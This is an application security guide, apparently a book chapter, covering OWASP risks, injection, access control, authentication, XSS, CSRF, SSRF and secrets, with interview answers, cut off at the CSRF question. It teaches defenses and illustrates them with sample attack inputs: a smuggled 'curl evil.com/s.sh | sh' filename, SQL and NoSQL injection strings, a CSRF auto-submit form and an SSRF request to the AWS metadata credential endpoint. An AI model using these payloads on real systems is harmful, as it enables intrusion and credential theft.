# 🔐 Application Security

> Almost every vulnerability is one of two failures: **trusting input you shouldn't**, or **failing to check whether this specific user may do this specific thing to this specific object**. Learn to see those two shapes and the OWASP list stops being a list to memorize.

---

## 📑 Contents

1. [The Two Root Causes](#1-the-two-root-causes)
2. [OWASP Top 10](#2-owasp-top-10)
3. [Injection](#3-injection)
4. [Broken Access Control](#4-broken-access-control)
5. [Authentication](#5-authentication)
6. [Session Management](#6-session-management)
7. [XSS](#7-xss)
8. [CSRF](#8-csrf)
9. [SSRF](#9-ssrf)
10. [Deserialization & File Upload](#10-deserialization--file-upload)
11. [Security Headers](#11-security-headers)
12. [Secrets Management](#12-secrets-management)
13. [Threat Modeling](#13-threat-modeling)
14. [Secure SDLC](#14-secure-sdlc)
15. [Interview Section](#15-interview-section)
16. [Cheat Sheet](#16-cheat-sheet)

---

## 1. The Two Root Causes

```
   ⭐ ROOT CAUSE #1: DATA BECOMES CODE

   You take input and put it somewhere an interpreter runs it.

   SQL query      → SQL injection
   HTML page      → XSS
   Shell command  → command injection
   LDAP filter    → LDAP injection
   Template       → SSTI
   Deserializer   → insecure deserialization

   ⭐ THE FIX IS ALWAYS THE SAME SHAPE:
     SEPARATE CODE FROM DATA at the interpreter boundary.
     Parameterized queries. Contextual output encoding.
     Argument arrays instead of shell strings.

   ⚠️ Escaping and sanitizing are FALLBACKS. They fail because
     you must get every context and every edge case right,
     forever. Separation cannot fail that way.
```

```
   ⭐ ROOT CAUSE #2: MISSING AUTHORIZATION

   You verified WHO the user is, then forgot to check WHAT
   they may do to THIS object.

   → Broken Object Level Authorization (BOLA/IDOR)
   → Broken Function Level Authorization
   → Mass assignment
   → Privilege escalation

   ⭐ THIS IS THE #1 CAUSE OF REAL API BREACHES, and it's
     invisible in testing because you only ever test with
     your own data.
```

```
   THE PRINCIPLES UNDERNEATH

   ┌──────────────────────────────────────────────────────────────┐
   │ DEFENSE IN DEPTH      Every control WILL fail. Layer them.   │
   │ LEAST PRIVILEGE       Minimum access, minimum duration       │
   │ FAIL SECURELY         ⭐ An error must DENY, never allow.     │
   │                       `if (denied) return` beats             │
   │                       `if (allowed) proceed`                 │
   │ ⭐ COMPLETE MEDIATION  Check EVERY access, EVERY time.        │
   │                       Never cache an authorization decision  │
   │                       across a trust boundary.               │
   │ SECURE BY DEFAULT     The safe path must be the easy path    │
   │ ⭐ NO SECURITY BY      Assume the attacker has your source    │
   │   OBSCURITY           code. They often literally do.         │
   │ MINIMIZE ATTACK       Every feature, port, and dependency    │
   │   SURFACE             is surface area                        │
   └──────────────────────────────────────────────────────────────┘
```

---

## 2. OWASP Top 10

```
   ┌────┬──────────────────────────────┬────────────────────────────┐
   │ A01│ ⭐ Broken Access Control      │ #1 for a reason            │
   │ A02│ Cryptographic Failures       │ plaintext, weak algorithms │
   │ A03│ Injection                    │ SQL, XSS, command, LDAP    │
   │ A04│ Insecure Design              │ ⭐ flaws you can't patch —  │
   │    │                              │ needs threat modeling      │
   │ A05│ Security Misconfiguration    │ defaults, verbose errors   │
   │ A06│ ⭐ Vulnerable Components      │ your dependencies          │
   │ A07│ Auth Failures                │ credential stuffing, weak  │
   │    │                              │ session handling           │
   │ A08│ Integrity Failures           │ ⭐ supply chain, unsigned   │
   │    │                              │ updates, deserialization   │
   │ A09│ Logging & Monitoring Failures│ ⭐ you can't respond to     │
   │    │                              │ what you can't see         │
   │ A10│ SSRF                         │ ⭐ made critical by cloud   │
   │    │                              │ metadata endpoints         │
   └────┴──────────────────────────────┴────────────────────────────┘

   ⭐ THE API SECURITY TOP 10 IS DIFFERENT and more relevant for
     backend work — it's dominated by authorization failures:
     BOLA, broken function-level auth, broken object property
     level auth, and unrestricted resource consumption.
```

---

## 3. Injection

### SQL Injection

```python
# ❌ THE VULNERABILITY
query = f"SELECT * FROM users WHERE email = '{email}'"
# input: ' OR '1'='1' --
# → SELECT * FROM users WHERE email = '' OR '1'='1' --'
#   returns every user

# ✅ PARAMETERIZED — the ONLY correct fix
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

```
   ⭐ WHY PARAMETERIZATION WORKS AND ESCAPING DOESN'T

   Parameterization sends the QUERY STRUCTURE and the DATA
   over separate channels. The database parses the query,
   builds an execution plan, and THEN binds values. The value
   can never be re-parsed as SQL — it is structurally
   impossible, not merely difficult.

   Escaping tries to neutralize dangerous characters, which
   means being right about every character set, every encoding,
   and every SQL dialect quirk, forever. One miss is a breach.
```

```python
# ⚠️ WHAT PARAMETERIZATION CANNOT PROTECT — identifiers
# You CANNOT parameterize table names, column names, or ORDER BY
sort = request.args.get("sort")
query = f"SELECT * FROM orders ORDER BY {sort}"     # ❌ INJECTABLE

# ✅ ALLOWLIST — the only safe approach for identifiers
ALLOWED_SORTS = {"created_at", "total", "status"}
if sort not in ALLOWED_SORTS:
    raise BadRequest("invalid sort field")
query = f"SELECT * FROM orders ORDER BY {sort}"     # ✅ now safe
```

```
   ⚠️ ORMs ARE NOT AUTOMATICALLY SAFE

   Every ORM has a raw-SQL escape hatch, and that's where the
   injection lives:
     • SQLAlchemy: text() with f-string interpolation
     • Django:     .extra(), .raw(), RawSQL()
     • Sequelize:  sequelize.query() with template literals

   ⭐ Grep your codebase for these. They're where the bugs are.

   OTHER INJECTION CONTEXTS
     NoSQL   ⚠️ {"$gt": ""} passed as a value bypasses auth
             → validate TYPES, not just values
     LDAP    escape ( ) * \ NUL in filters
     ⭐ Command  execFile with an ARRAY, never exec with a string
     Template ⭐ SSTI → RCE. Never build templates from user input.
     XPath, XML (XXE), SMTP header, log injection
```

```python
# ⭐ COMMAND INJECTION — the array-vs-string distinction
import subprocess

# ❌ shell=True with interpolation → RCE
subprocess.run(f"convert {filename} out.png", shell=True)
#   filename = "x.jpg; curl evil.com/s.sh | sh"

# ✅ Array form — no shell, no parsing, arguments stay arguments
subprocess.run(["convert", filename, "out.png"], check=True)
```

---

## 4. Broken Access Control

#### 💬 The single most important section in this book

```
   ⚠️⚠️ BOLA / IDOR — Broken Object Level Authorization

   The endpoint authenticates the caller but fetches the object
   by ID alone, without checking ownership.
```

```python
# ❌ THE VULNERABILITY — authenticated, but not authorized
@app.get("/orders/{order_id}")
async def get_order(order_id: str, user=Depends(current_user)):
    return await db.order.find(order_id)
#   ⚠️ ANY logged-in user can read ANY order by changing the ID

# ✅ SCOPE THE QUERY BY OWNERSHIP
@app.get("/orders/{order_id}")
async def get_order(order_id: str, user=Depends(current_user)):
    order = await db.order.find_one(id=order_id, customer_id=user.id)
    if not order:
        raise HTTPException(404)    # ⭐ 404 not 403 — don't confirm
    return order                    #   the object exists
```

```
   ⭐ WHY THIS IS SO COMMON AND SO DANGEROUS

   It's INVISIBLE IN TESTING. Every developer tests with their
   own account and their own data, and everything works. The
   bug only appears when someone changes an ID.

   ⭐ THE ARCHITECTURAL FIX — don't rely on discipline
     Make it IMPOSSIBLE to fetch a resource without a subject.
     A data access layer where every method requires the acting
     user, so the unsafe call doesn't compile or doesn't exist.

     def get_order(order_id, *, actor):   # actor is REQUIRED
         ...

   ⭐ AND TEST FOR IT: automated tests that authenticate as user
     A and attempt to access user B's resources, asserting 404.
     Run them for every resource type.
```

```
   ⚠️ 404 vs 403 — a real decision
     403 confirms the object exists, which leaks information
     (does user 12345 exist? does order 999 exist?).
     ⭐ Return 404 for objects the caller may not even know about.
     Use 403 only when the caller legitimately knows the object
     exists but lacks permission for this specific action.
```

### Mass assignment

```python
# ❌ Binding the whole request body to a model
user.update(**request.json)
#   attacker sends {"email": "x@y.com", "role": "admin",
#                   "email_verified": true, "credits": 999999}

# ✅ EXPLICIT ALLOWLIST — never a denylist
class UserUpdate(BaseModel):
    model_config = ConfigDict(extra="forbid")   # ⭐ reject unknown fields
    display_name: str | None = None
    bio: str | None = None
    # role, credits, and verified flags are NOT here, so they
    # cannot be set — structurally, not by remembering
```

### Function-level authorization

```python
# ⚠️ Hiding a button in the UI is NOT authorization.
#   The endpoint is still reachable with curl.

# ✅ Enforce at the router level so it can't be forgotten
router = APIRouter(
    prefix="/admin",
    dependencies=[Depends(require_role("admin"))],   # ⭐ every route
)
```

```
   ⭐ THE ACCESS CONTROL CHECKLIST

   □ Deny by default — an unmatched route or an unhandled case
     must reject
   □ Authorize the OBJECT, not just the route
   □ Enforce server-side; the UI is a convenience, not a control
   □ ⚠️ Never trust a client-supplied user ID, role, or tenant ID
   □ ⭐ Re-check on EVERY request — never cache an authorization
     decision across requests
   □ Multi-tenant: tenant_id in every query and every cache key
   □ Log authorization failures (they're an attack signal)
   □ ⭐ Automated cross-tenant access tests in CI
```

---

## 5. Authentication

### Password storage

```python
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # iterations
    memory_cost=65536,  # ⭐ 64 MB — memory-hardness is what
    parallelism=4,      #   defeats GPU/ASIC cracking
)
hash = ph.hash(password)
ph.verify(hash, password)
```

```
   ⭐ THE ALGORITHM RANKING
     1. Argon2id   ⭐ current best — memory-hard, tunable
     2. scrypt     also memory-hard
     3. bcrypt     fine, but ⚠️ a 72-byte input limit that
                   silently truncates
     4. PBKDF2     acceptable only where FIPS compliance
                   requires it — GPU-friendly, so weakest
     ❌ NEVER: MD5, SHA-1, SHA-256 alone, or any unsalted hash

   ⭐ WHY MEMORY-HARDNESS MATTERS
     Fast hashes are fast for attackers too. A GPU computes
     billions of SHA-256 hashes per second. Argon2 deliberately
     requires large memory per hash, which GPUs and ASICs
     cannot parallelize cheaply. That's the entire point.
```

```
   ⭐ PASSWORD POLICY — modern guidance (NIST 800-63B)

   ✅ Minimum 8, ideally 12+ characters
   ✅ ⭐ Check against known-breached password lists
     (Have I Been Pwned's k-anonymity API lets you do this
      without sending the password)
   ✅ Allow up to at least 64 characters, all Unicode, and
      allow paste (⭐ blocking paste breaks password managers,
      which makes security worse)
   ❌ ⭐ NO forced periodic rotation — it demonstrably produces
      Password1!, Password2!, and is now advised against
   ❌ NO composition rules (must contain a symbol) — they
      reduce entropy by making passwords predictable
   ❌ ⚠️ NO security questions — mother's maiden name is public
```

```
   ⚠️ TIMING ATTACKS AND USER ENUMERATION

   # ❌ Leaks whether an account exists — via the response AND
   #   via the timing (no hash is computed for a missing user)
   user = db.find(email)
   if not user: return "No such user"
   if not verify(password, user.hash): return "Wrong password"

   # ✅ Same message, same work regardless
   user = db.find(email)
   valid = ph.verify(user.hash if user else DUMMY_HASH, password)
   #                              ⭐ hash a dummy so timing matches
   if not user or not valid:
       return "Invalid email or password"
```

### MFA

```
   ⭐ STRENGTH ORDER

   1. ⭐ WebAuthn / Passkeys   PHISHING-RESISTANT — the credential
                               is bound to the origin, so a fake
                               site cannot use it. This is the
                               only genuinely phishing-proof factor.
   2. Hardware token (FIDO2)
   3. TOTP authenticator app
   4. Push notification        ⚠️ vulnerable to MFA fatigue
                               (spam prompts until the user taps)
                               → require number matching
   5. ⚠️ SMS                    Vulnerable to SIM swapping.
                               Better than nothing; not much.

   ⭐ WHY PASSKEYS ARE DIFFERENT: every other factor can be
     phished by a convincing proxy site that relays the code
     in real time. WebAuthn signs a challenge bound to the
     actual origin, so a relay simply fails.
```

### JWT

```
   ⚠️ THE JWT REALITY CHECK
     header.payload.signature — base64url encoded, NOT ENCRYPTED.
     Anyone holding the token can read the payload.
     ⭐ And you cannot revoke one before expiry without server
       state — which defeats the main reason people choose JWTs.
```

```
   ⭐ THE WORKABLE PATTERN

   ACCESS TOKEN    JWT, 5-15 minutes, stateless.
                   Short life IS the revocation strategy.
   REFRESH TOKEN   Opaque, stored server-side, long-lived,
                   revocable, and ⭐ ROTATED ON EVERY USE.

   ⭐ REFRESH ROTATION WITH REUSE DETECTION
     Each refresh issues a new pair and invalidates the old.
     If an OLD refresh token is used again, it was stolen —
     ⭐ revoke the ENTIRE token family immediately.
     This detects theft rather than merely limiting its window.
```

```
   ⚠️ JWT VULNERABILITIES TO KNOW

   • alg: none          → ⭐ PIN the algorithm server-side,
                          never trust the header
   • RS256 → HS256      → an attacker signs with the PUBLIC key
                          as an HMAC secret. Same fix: pin it.
   • Unvalidated claims → always check iss, aud, exp, nbf
   • ⚠️ Secrets in the payload — it's readable
   • ⚠️ Storing in localStorage — any XSS reads it instantly
     ⭐ Use HttpOnly + Secure + SameSite cookies for browsers
```

---

## 6. Session Management

```python
response.set_cookie(
    "session", token,
    httponly=True,      # ⭐ JavaScript cannot read it → XSS can't steal it
    secure=True,        # HTTPS only
    samesite="lax",     # ⭐ CSRF protection
    max_age=3600,
    path="/",
    # ⚠️ Do NOT set `domain` unless you need subdomain sharing —
    #   it widens exposure to every subdomain
)
```

```
   SameSite VALUES
     Strict  ⚠️ Not sent on ANY cross-site request, including
             following a link from another site — so users
             arrive logged out. Poor UX for most apps.
     Lax  ⭐  Sent on top-level GET navigations only. The right
             default: blocks CSRF on state-changing methods
             while preserving normal navigation.
     None    Sent always. ⚠️ Requires Secure. Only for genuine
             cross-site needs (embedded widgets, SSO).
```

```
   ⭐ SESSION SECURITY RULES

   □ ⭐ REGENERATE the session ID on privilege change (login,
     step-up auth) — otherwise SESSION FIXATION: an attacker
     plants a known session ID, the victim logs in, and the
     attacker now holds an authenticated session
   □ Cryptographically random IDs (≥128 bits from a CSPRNG)
   □ Absolute timeout AND idle timeout
   □ Invalidate server-side on logout — ⚠️ clearing the cookie
     alone leaves a token that still works if it was captured
   □ ⭐ Bind loosely to context (a coarse IP or user-agent change
     triggers re-auth) — but not strictly, or mobile users on
     changing networks get logged out constantly
   □ Let users view and revoke active sessions
```

---

## 7. XSS

```
   ⭐ THE THREE TYPES

   STORED      Payload persists in the database and is served
               to every viewer. Most severe — one injection,
               many victims.
   REFLECTED   Payload comes from the request and is echoed
               back. Requires tricking the victim into
               following a link.
   DOM-BASED   Never touches the server. Client-side JS writes
               attacker-controlled data into a dangerous sink
               (innerHTML, eval, document.write).
               ⚠️ Server-side defenses don't help at all.
```

```
   ⭐ THE FIX IS CONTEXT-DEPENDENT ENCODING

   The SAME data needs DIFFERENT encoding depending on where
   it lands:

   ┌──────────────────────────────────────────────────────────────┐
   │ HTML body      → HTML entity encode  (< → &lt;)              │
   │ HTML attribute → attribute encode + ALWAYS quote             │
   │ JavaScript     → ⚠️ JS string encode — and never put user     │
   │                  data in a JS context if you can avoid it    │
   │ URL parameter  → URL encode                                  │
   │ CSS            → CSS encode                                  │
   └──────────────────────────────────────────────────────────────┘

   ⭐ MODERN FRAMEWORKS ENCODE BY DEFAULT — React, Vue, Angular
     all escape interpolated values. The vulnerabilities are in
     the ESCAPE HATCHES:
       React:   dangerouslySetInnerHTML
       Vue:     v-html
       Angular: bypassSecurityTrustHtml
       Plain:   innerHTML, outerHTML, document.write, eval,
                new Function, setTimeout with a string

     ⭐ Grep for these. That's where XSS lives in modern apps.
```

```javascript
// ⭐ If you must render user HTML, SANITIZE with a real library
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userHtml);
// ⚠️ Never write your own sanitizer. The bypass space is enormous
//   and researchers find new ones constantly.

// ⚠️ javascript: URLs are an XSS vector people forget
<a href={userUrl}>  // userUrl = "javascript:alert(1)"
// ✅ Validate the scheme against an allowlist: https, http, mailto
```

```
   ⭐ CSP AS DEFENSE IN DEPTH (not a substitute for encoding)

   Content-Security-Policy:
     default-src 'self';
     script-src 'nonce-{random}' 'strict-dynamic';
     object-src 'none';
     base-uri 'none';
     frame-ancestors 'none'

   ⭐ NONCE-BASED + strict-dynamic is the modern approach.
     Allowlisting domains is largely broken — most CDNs host
     something that can be abused to bypass it.
   ⚠️ 'unsafe-inline' or 'unsafe-eval' in script-src makes CSP
     nearly useless for XSS.
```

---

## 8. CSRF

```
   ⭐ THE ATTACK — and why cookies enable it

   1. Victim is logged into bank.com (session cookie set)
   2. Victim visits evil.com
   3. evil.com contains:
        <form action="https://bank.com/transfer" method="POST">
          <input name="to" value="attacker"><input name="amount" value="10000">
        </form>
        <script>document.forms[0].submit()</script>
   4. ⭐ The browser AUTOMATICALLY attaches bank.com's cookie
   5. The transfer executes with the victim's authority

   ⭐ THE ROOT CAUSE: cookies are sent automatically based on
     DESTINATION, regardless of which site initiated the request.
     The server cannot distinguish a legitimate form submission
     from a forged one — unless you add something the attacker
     cannot know or send.
```

```
   ⭐ DEFENSES, LAYERED

   1. ⭐ SameSite=Lax cookies — blocks the attack for POST/PUT/
      DELETE. Now the default in major browsers, which has
      dramatically reduced CSRF in practice.
   2. ⭐ Anti-CSRF token — a random per-session value in a
      hidden form field or header, validated server-side.
      ⭐ Works because the attacker's site cannot READ the token
        (same-origin policy prevents it).
   3. Double-submit cookie — token in both a cookie and a
      header; the server checks they match. Stateless, but
      ⚠️ weaker if any subdomain is compromised.
   4. Origin/Referer header validation — a useful additional
      check, but headers can be absent in some configurations.
   5. Re-authentication for genuinely sensitive actions
      (changing a password, transferring money)

   ⭐ APIs USING BEARER TOKENS IN HEADERS ARE NOT CSRF-VULNERABLE,
     because the browser doesn't attach Authorization headers
     automatically. ⚠️ But if you ALSO accept cookie auth on the
     same endpoints, you're vulnerable again.
```

---

## 9. SSRF

```
   ⭐ THE ATTACK: you fetch a URL the user supplied, and they
     point it INSIDE your network.

   POST /fetch-preview  { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }

   ⚠️⚠️ THAT IS THE AWS INSTANCE METADATA ENDPOINT.
     A successful SSRF there returns temporary IAM CREDENTIALS
     for the instance role — which is a full cloud compromise,
     not a minor information leak.

   ⭐ This is exactly how the 2019 Capital One breach happened.
```

```
   ⭐ DEFENSES — you need SEVERAL, because each has bypasses

   □ ⭐ ALLOWLIST destinations. A denylist is unwinnable —
     attackers use decimal IPs (2130706433), IPv6-mapped
     addresses, DNS names resolving to internal IPs, redirects,
     and 0.0.0.0.
   □ Resolve the hostname, validate the RESOLVED IP, and
     ⭐ pin the connection to it — otherwise DNS rebinding
     changes the answer between your check and the request
   □ Block RFC1918 (10/8, 172.16/12, 192.168/16), loopback,
     ⭐ and link-local 169.254.0.0/16 specifically
   □ ⚠️ Do not follow redirects, or re-validate every hop
   □ Allowlist schemes: http and https only — block file://,
     gopher://, dict://
   □ ⭐ IMDSv2 on AWS (session-token required, and the PUT
     request can't be triggered by a simple SSRF)
   □ ⭐ Network egress policy — the app shouldn't be able to
     reach internal services it doesn't need
   □ Make outbound fetches from an isolated service or a
     dedicated proxy with no cloud credentials
```

---

## 10. Deserialization & File Upload

```
   ⚠️ INSECURE DESERIALIZATION → REMOTE CODE EXECUTION

   Java  ObjectInputStream       ⭐ gadget chains in common libs
   Python pickle                 ⭐ pickle.loads IS arbitrary
                                   code execution, by design
   PHP   unserialize()
   Ruby  Marshal.load
   .NET  BinaryFormatter (now deprecated for this reason)

   ⭐ THE RULE: NEVER deserialize untrusted data with a format
     that can instantiate arbitrary objects.
     Use JSON with a schema. It can only produce data.
```

```
   ⭐ FILE UPLOAD — the checklist

   □ ⚠️ Validate the CONTENT, not the extension or the
     Content-Type header (both are attacker-controlled).
     Check magic bytes, and re-encode images through a library.
   □ ⭐ Store OUTSIDE the web root, or in object storage — never
     where the web server might execute it
   □ ⭐ Generate a random filename; never use the user's
     (path traversal, and Windows reserved names like CON/NUL)
   □ Enforce a size limit BEFORE reading the whole file
   □ Serve from a different origin with
     `Content-Disposition: attachment` and `X-Content-Type-
     Options: nosniff`
   □ ⚠️ Scan archives for zip bombs and path traversal in
     entry names (../../etc/passwd)
   □ Malware scan if users download each other's files
```

---

## 11. Security Headers

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
   ⭐ Forces HTTPS. Prevents SSL-stripping attacks.

Content-Security-Policy: default-src 'self'; script-src 'nonce-{r}'
   'strict-dynamic'; object-src 'none'; base-uri 'none';
   frame-ancestors 'none'
   ⭐ Defense in depth against XSS and clickjacking

X-Content-Type-Options: nosniff
   ⚠️ Without it, browsers may guess a content type and execute
     an uploaded "image" as script

Referrer-Policy: strict-origin-when-cross-origin
   ⭐ Stops leaking full URLs (which may contain tokens or IDs)
     to third parties

Permissions-Policy: geolocation=(), camera=(), microphone=()
   Disables powerful features you don't use

Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
   ⭐ Process isolation — Spectre mitigation

Cache-Control: no-store   (on any response with sensitive data)
```

```
   ⚠️ CORS IS NOT A SECURITY CONTROL — IT'S A RELAXATION OF ONE.

   The same-origin policy is the protection. CORS selectively
   loosens it.

   ⚠️ THE FATAL MISCONFIGURATION:
     Access-Control-Allow-Origin: <reflects the request Origin>
     Access-Control-Allow-Credentials: true
     → ANY site can make authenticated requests as your users.

   ⭐ Use an explicit allowlist. Never reflect arbitrary origins
     with credentials enabled. And note the wildcard `*` is
     legitimately forbidden with credentials — reflection is
     people working around that restriction, which is exactly
     the bug.
```

---

## 12. Secrets Management

```
   ⭐ THE HIERARCHY, BEST TO WORST

   1. ⭐ NO SECRET AT ALL — workload identity (IAM roles, IRSA,
      GKE Workload Identity, OIDC federation). Short-lived
      credentials issued automatically. Nothing to steal.
   2. Secrets manager with automatic rotation
      (Vault, AWS Secrets Manager)
   3. Encrypted at rest, injected at runtime as FILES
   4. Environment variables — ⚠️ leak via /proc, crash dumps,
      child processes, and error-reporting tools
   5. ⚠️ Encrypted in the repo (SOPS/Sealed Secrets) — acceptable
      for config, poor for high-value secrets
   6. ⚠️⚠️ Plaintext in code or config — never
```

```
   ⭐ WHEN A SECRET LEAKS — the order matters

   1. ⭐ ROTATE FIRST. Immediately. Before anything else.
   2. Then assess: what could it access, and what did it access?
      (check audit logs)
   3. ⚠️ Removing it from git history does NOT count as
      remediation. It's already cloned, cached, and indexed.
      Rotation is the only real fix.
   4. Add detection so it can't recur silently:
      pre-commit hooks (gitleaks), CI scanning, and GitHub
      secret scanning with push protection
```

---

## 13. Threat Modeling

```
   ⭐ STRIDE — a checklist for "what could go wrong here?"

   ┌──────────────────────────────────────────────────────────────┐
   │ S  Spoofing               → authentication                   │
   │ T  Tampering              → integrity, signing, checksums    │
   │ R  Repudiation            → audit logging                    │
   │ I  Information disclosure → encryption, access control       │
   │ D  Denial of service      → rate limiting, quotas, timeouts  │
   │ E  Elevation of privilege → ⭐ authorization                  │
   └──────────────────────────────────────────────────────────────┘
```

```
   ⭐ THE FOUR QUESTIONS (Shostack) — simpler and more useful

   1. What are we building?         → draw a data flow diagram
   2. What can go wrong?            → STRIDE each element and
                                       each TRUST BOUNDARY
   3. What are we going to do?      → mitigate · accept ·
                                       transfer · eliminate
   4. Did we do a good job?         → validate and revisit

   ⭐ TRUST BOUNDARIES ARE WHERE THE BUGS ARE.
     Any place data crosses from a less-trusted zone to a
     more-trusted one: browser→server, service→service,
     third party→you, user input→interpreter.
     Mark them on the diagram and scrutinize each one.
```

```
   ⭐ DO IT AT DESIGN TIME.
     OWASP A04 is "Insecure Design" precisely because
     architectural flaws cannot be patched later. A system
     that stores plaintext card numbers has a design problem,
     not a bug.
```

---

## 14. Secure SDLC

```
   ┌──────────────────────────────────────────────────────────────┐
   │ DESIGN     ⭐ Threat model. Security requirements as          │
   │            acceptance criteria, not an afterthought.         │
   ├──────────────────────────────────────────────────────────────┤
   │ DEVELOP    Secure defaults in frameworks and libraries.      │
   │            ⭐ Make the safe path the EASY path — a shared     │
   │            data layer that requires an actor, an HTTP client │
   │            with SSRF protection built in. Developers use     │
   │            what's convenient.                                │
   ├──────────────────────────────────────────────────────────────┤
   │ BUILD      SAST · secret scanning · dependency audit ·       │
   │            container scanning · ⭐ all in CI with a real      │
   │            patch SLA, not an ignored report                  │
   ├──────────────────────────────────────────────────────────────┤
   │ TEST       DAST · ⭐ authorization tests (cross-tenant        │
   │            access attempts) · fuzzing on parsers             │
   ├──────────────────────────────────────────────────────────────┤
   │ DEPLOY     Signed artifacts · least-privilege runtime ·      │
   │            secrets from a manager · admission policies       │
   ├──────────────────────────────────────────────────────────────┤
   │ OPERATE    ⭐ Logging and alerting on security events ·       │
   │            incident response plan · a bug bounty or at       │
   │            minimum a security.txt disclosure contact         │
   └──────────────────────────────────────────────────────────────┘
```

```
   ⭐ SECURITY LOGGING — what to record

   ✅ Authentication attempts (success AND failure)
   ✅ Authorization failures ⭐ (a strong attack signal)
   ✅ Privilege and role changes
   ✅ Data access to sensitive records
   ✅ Admin actions
   ✅ Input validation failures at unusual volume
   ⭐ Each with: who, what, when, from where, and the outcome

   ⚠️ NEVER LOG: passwords, tokens, session IDs, full card
     numbers, or full request bodies that might contain them
   ⭐ Redact at the logging LIBRARY level, not by remembering
     at each call site.
```

---

## 15. Interview Section

<details>
<summary><b>Q1. What's the most common serious vulnerability in modern APIs?</b></summary>

Broken object level authorization — BOLA, sometimes called IDOR. It's number one on the OWASP API Security Top 10 and behind most real API breaches.

The pattern is that an endpoint authenticates the caller but fetches the object by ID alone. So any logged-in user can read anyone's order by changing a number in the URL.

The fix at the code level is scoping every query by ownership rather than checking after fetching, and returning 404 rather than 403 so you don't confirm the object exists.

But the reason it's so common is that it's invisible in testing — every developer tests with their own account and their own data, and everything works perfectly. So relying on developer discipline guarantees it recurs.

The architectural fix is making the unsafe call impossible: a data access layer where every method requires the acting user as a mandatory parameter, so you cannot fetch a resource without a subject. Plus automated tests that authenticate as user A, attempt to access user B's resources, and assert 404 — run for every resource type.
</details>

<details>
<summary><b>Q2. Why are parameterized queries better than escaping?</b></summary>

Because they separate code from data at the protocol level rather than trying to neutralize dangerous characters.

With parameterization, the query structure and the values travel over separate channels. The database parses the query, builds an execution plan, and only then binds values. A value can never be re-parsed as SQL — it's structurally impossible, not merely difficult.

Escaping requires being right about every character set, every encoding, and every dialect quirk, forever. One miss is a breach. It's a fundamentally weaker guarantee.

Two caveats worth raising. Parameterization cannot protect identifiers — table names, column names, ORDER BY clauses. Those need an allowlist, and a user-controlled sort parameter is a classic injection point people miss.

And ORMs aren't automatically safe. Every ORM has a raw SQL escape hatch — SQLAlchemy's `text()`, Django's `.extra()` and `.raw()`, Sequelize's `query()` — and that's exactly where injection lives in ORM-based codebases. Those are the things to grep for during a review.
</details>

<details>
<summary><b>Q3. Explain XSS and how to prevent it.</b></summary>

XSS is injecting script into a page so it executes with the victim's session and origin. Three types: stored, where the payload persists and hits every viewer; reflected, echoed back from a request; and DOM-based, where it never touches the server because client-side JavaScript writes attacker data into a dangerous sink.

The primary defense is context-appropriate output encoding, and the context matters — HTML body, HTML attribute, JavaScript, URL, and CSS all need different encoding. The same value that's safe in one is dangerous in another.

Modern frameworks encode by default, so in a React or Vue codebase the vulnerabilities are concentrated in the escape hatches: `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrustHtml`, and direct `innerHTML` manipulation. Those are what to search for.

If you genuinely must render user-supplied HTML, use a maintained sanitizer like DOMPurify. Never write your own — the bypass space is enormous and researchers find new ones continuously.

Then CSP as defense in depth, ideally nonce-based with `strict-dynamic`, since domain allowlisting is largely broken. And it's defense in depth, not a substitute — a CSP with `unsafe-inline` provides almost nothing.

One vector people forget: `javascript:` URLs in href attributes. Validate the scheme against an allowlist.
</details>

<details>
<summary><b>Q4. What is SSRF and why is it critical in cloud environments?</b></summary>

SSRF is making the server fetch a URL the attacker controls, so requests originate from inside your network with your server's network position and identity.

It's critical in cloud specifically because of the instance metadata endpoint at 169.254.169.254. A successful SSRF there returns temporary IAM credentials for the instance role — a full cloud compromise rather than an information leak. That's essentially how the Capital One breach happened.

Defense needs several layers because each has bypasses. Allowlist destinations rather than denylisting, because denylists are unwinnable — attackers use decimal-encoded IPs, IPv6-mapped addresses, DNS names resolving internally, and redirects.

Resolve the hostname, validate the resolved IP, and pin the connection to it, otherwise DNS rebinding changes the answer between your check and the request. Block private ranges, loopback, and link-local specifically. Don't follow redirects, or revalidate each hop. Allowlist schemes to http and https.

Then the infrastructure controls, which matter more than the code controls: IMDSv2 on AWS, since it requires a session token obtained via PUT that a simple SSRF can't trigger. And network egress policy so the application can't reach internal services it doesn't need.
</details>

<details>
<summary><b>Q5. How should passwords be stored?</b></summary>

Argon2id, with tuned parameters — around 64 megabytes of memory, three iterations. scrypt is the reasonable alternative; bcrypt is acceptable but has a 72-byte input limit that silently truncates; PBKDF2 only where FIPS compliance forces it.

The property that matters is memory-hardness. Fast hashes are fast for attackers too — a GPU computes billions of SHA-256 hashes per second. Argon2 deliberately requires substantial memory per hash, which GPUs and ASICs can't parallelize cheaply. That's the entire defense.

On policy, current NIST guidance is close to the opposite of traditional advice. Minimum length, check against known-breached password lists, allow long passwords and paste — blocking paste breaks password managers, which makes security worse. And explicitly no forced rotation and no composition rules, because both demonstrably produce predictable passwords.

One implementation detail worth mentioning: verify against a dummy hash when the user doesn't exist. Otherwise the response time differs measurably between "no such account" and "wrong password," which enables user enumeration even with identical error messages.
</details>

<details>
<summary><b>Q6. JWT vs sessions — which and why?</b></summary>

Sessions by default for browser applications. A server-side session with an HttpOnly, Secure, SameSite cookie gives instant revocation, no token in JavaScript-readable storage, and simple invalidation on logout.

JWTs make sense for stateless service-to-service authentication, or where a service must validate a token without calling an auth service.

The honest problem with JWTs is that you can't revoke one before expiry without server state — which defeats the main reason people choose them. So the workable pattern is short-lived access tokens, five to fifteen minutes, where the short lifetime is the revocation strategy, paired with opaque, server-stored, revocable refresh tokens.

Refresh rotation with reuse detection is worth building: each refresh issues a new pair and invalidates the old, and if an old refresh token is used again, it was stolen, so you revoke the entire family. That detects theft rather than just limiting the window.

The vulnerabilities to know: `alg: none` and the RS256-to-HS256 confusion attack, both fixed by pinning the algorithm server-side rather than trusting the header. Always validating issuer, audience, and expiry. Never putting secrets in the payload, since it's readable. And never storing tokens in localStorage, where any XSS retrieves them instantly.
</details>

<details>
<summary><b>Q7. Explain CSRF and its modern defenses.</b></summary>

